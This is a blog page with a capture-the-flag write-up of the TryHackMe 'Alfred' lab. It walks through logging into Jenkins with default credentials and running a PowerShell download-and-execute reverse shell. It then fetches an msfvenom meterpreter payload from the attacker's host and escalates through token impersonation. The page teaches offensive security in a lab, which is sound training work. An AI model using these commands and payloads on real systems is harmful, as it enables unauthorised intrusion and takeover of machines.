<!doctype html><html lang=en-us dir=ltr><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Exploit Jenkins to gain an initial shell, then escalate your privileges by exploiting Windows authentication tokens."><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:title" content="Alfred"><meta property="og:description" content="Exploit Jenkins to gain an initial shell, then escalate your privileges by exploiting Windows authentication tokens."><meta property="og:type" content="article"><meta property="og:url" content="http://localhost:1313/posts/Alfred/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-05-23T00:00:00+00:00"><meta property="article:modified_time" content="2023-05-23T00:00:00+00:00"><title>Alfred | 乃 | Do or Die</title>
<link rel=manifest href=/manifest.json><link rel=icon href=/favicon.ico><link rel=canonical href=http://localhost:1313/posts/Alfred/><link rel=stylesheet href=/book.min.95be1f5938e136c9e7f1f54171c546b9f1f6b2a134f0152d9c292974fb0071c6.css integrity="sha256-lb4fWTjhNsnn8fVBccVGufH2sqE08BUtnCkpdPsAccY=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.fa1d89b50fd8476a6e864a1f9c9064fe6e4dd38d0c2751521401856f3d6c232b.js integrity="sha256-+h2JtQ/YR2puhkofnJBk/m5N040MJ1FSFAGFbz1sIys=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>乃 | Do or Die</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script><ul><li><input type=checkbox id=section-c72485dffab48e9851d40b64ff5c8557 class=toggle>
<label for=section-c72485dffab48e9851d40b64ff5c8557 class="flex justify-between"><a role=button>Try Hack Me</a></label><ul><li><a href=/docs/TryHackMe/Vulnversity/>Vulnversity</a></li><li><a href=/docs/TryHackMe/Blue/>Blue</a></li><li><a href=/docs/TryHackMe/Kenobi/>Kenobi</a></li><li><a href=/docs/TryHackMe/SteelMountain/>Steel Mountain</a></li><li><a href=/docs/TryHackMe/DailyBugle/>Daily Bugle</a></li></ul></li></ul><ul><li><a href=/posts/>Blog</a></li></ul></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu>
</label><strong>Alfred</strong>
<label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#exploitation>Exploitation</a></li><li><a href=#privilege-escalation>Privilege Escalation</a></li></ul></nav></aside></header><article class="markdown book-post"><h1><a href=/posts/Alfred/>Alfred</a></h1><h5>May 23, 2023</h5><div><a href=/categories/TryHackMe/>TryHackMe</a></div><div><a href=/tags/Scanning/>Scanning</a>,
<a href=/tags/Exploitation/>Exploitation</a>,
<a href=/tags/Enumeration/>Enumeration</a>,
<a href=/tags/Privilege-Escalation/>Privilege Escalation</a></div><p>Exploit Jenkins to gain an initial shell, then escalate your privileges by exploiting Windows authentication tokens.</p><h1 id=scanning>Scanning
<a class=anchor href=#scanning>#</a></h1><p>Let&rsquo;s begin scanning the target using Rustscan.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>rustscan -a 10.10.174.157 -r 1-65535 --ulimit <span style=color:#ae81ff>5000</span> -- -sVC
</span></span></code></pre></div><p>From the port scan, we can see that there are three open ports. Let&rsquo;s look what&rsquo;s running on that ports.</p><h1 id=enumeration>Enumeration
<a class=anchor href=#enumeration>#</a></h1><p>There is nothing interesting on port 80. But on port 8080, there is Jenkins running. All we can see is a login page. Let&rsquo;s try to use the default usernames:passwords, and then we will use automated tools to brute force the login page.</p><p>On using admin as username and admin as password, we are able to successfully login into the Jenkins server.</p><p>We can see a project that was already created. On clicking, it takes us to the following page.</p><p>The configure button on the left side leads to a page where we can execute Windows batch commands under the build section.</p><p>Let us try to see if it is working. We will now change the command to ipconfig and see if it works.</p><p>Save it and build.</p><p>After building, we will check the build history.</p><p>Under console output, we can see that there is output for the command we used earlier.</p><h1 id=exploitation>Exploitation
<a class=anchor href=#exploitation>#</a></h1><p>We will download <a href=https://github.com/samratashok/nishang>Nishang</a> into our machine and use the <a href=https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1 title=Invoke-PowerShellTcp.ps1>Invoke-PowerShellTcp.ps1</a> to get the reverse shell.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>git clone https://github.com/samratashok/nishang.git
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>cd nishang
</span></span></code></pre></div><p>Start the python webserver to host the file so that we can download it to the target machine.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>python -m http.server
</span></span></code></pre></div><p>Now copy the following command into the build section where we can execute commands. This command downloads the powershell script from our webserver and runs it on the target machine using the ip address and port that we specify as arguments. We will be using our machine ip address and the port that we want to use for the reverse shell.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>powershell iex <span style=color:#f92672>(</span>New-Object Net.WebClient<span style=color:#f92672>)</span>.DownloadString<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;http://10.6.29.149:8000/Invoke-PowerShellTcp.ps1&#39;</span><span style=color:#f92672>)</span>;Invoke-PowerShellTcp -Reverse -IPAddress 10.6.29.149 -Port <span style=color:#ae81ff>3333</span>
</span></span></code></pre></div><p>Save the changes and apply.</p><p>In a new terminal window, use netcat to listen on port 3333.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>nc -lnvp <span style=color:#ae81ff>3333</span>
</span></span></code></pre></div><p>Now build the project.</p><p>And we get a reverse shell!</p><p>Now we will elevate our shell to a meterpreter reverse shell.</p><p>We will generate a payload that we can run on the target machine and get a reverse shell in meterpreter.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST<span style=color:#f92672>=</span>10.6.29.149 LPORT<span style=color:#f92672>=</span><span style=color:#ae81ff>4444</span> -f exe -o shell.exe
</span></span></code></pre></div><p>Launch metasploit. Use multi/handler with the meterpreter payload set.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>msfconsole -q
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>use multi/handler
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>set payload windows/meterpreter/reverse_tcp
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>set lhost tun0
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>set lport <span style=color:#ae81ff>4444</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>run
</span></span></code></pre></div><p>Again start the python http server and download the generated payload to the target machine and run it.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>powershell <span style=color:#e6db74>&#34;(New-Object System.Net.WebClient).Downloadfile(&#39;http://10.6.29.149:8000/shell.exe&#39;,&#39;shell.exe&#39;)&#34;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Start-Process <span style=color:#e6db74>&#34;shell.exe&#34;</span>
</span></span></code></pre></div><p>Go back to metasploit and we get a meterpreter session opened.</p><h1 id=privilege-escalation>Privilege Escalation
<a class=anchor href=#privilege-escalation>#</a></h1><p>Let&rsquo;s check the privileges for the user that we are currenlty logged in.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>whoami /priv
</span></span></code></pre></div><p>We can see that the SeImpersonatePrivilege is enabled. Let&rsquo;s try token impersonation.</p><p>Load the incognito module and list the available tokens.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>load incognito
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>list_tokens -g
</span></span></code></pre></div><p>We can see that there is BUILTIN\Administrators token available. Let&rsquo;s impersonate that token.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>impersonate_token <span style=color:#e6db74>&#34;BUILTIN\Administrators&#34;</span>
</span></span><span style=display:flex><span><span style=color:#e6db74>```</span>shell
</span></span><span style=display:flex><span>Now we will check <span style=color:#66d9ef>if</span> we got the privileged access.
</span></span><span style=display:flex><span><span style=color:#e6db74>```</span>shell
</span></span><span style=display:flex><span>getuid
</span></span></code></pre></div><p>We can see that we have higher privileged token but we will not get permissions of privileged user unless we migrate our process to another process with correct privileges . We will migrate our process from shell.exe to services.exe so that we can get the permissions of a privileged user.</p><p>We will check the processes and then migrate from shell.exe to services.exe.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>ps
</span></span></code></pre></div><p>Use the PID of the services.exe to migrate.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>migrate <span style=color:#ae81ff>668</span>
</span></span></code></pre></div><p>Now have privileged access and we can read the root flag located at C:\Windows\System32\config.</p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#exploitation>Exploitation</a></li><li><a href=#privilege-escalation>Privilege Escalation</a></li></ul></nav></div></aside></main></body></html>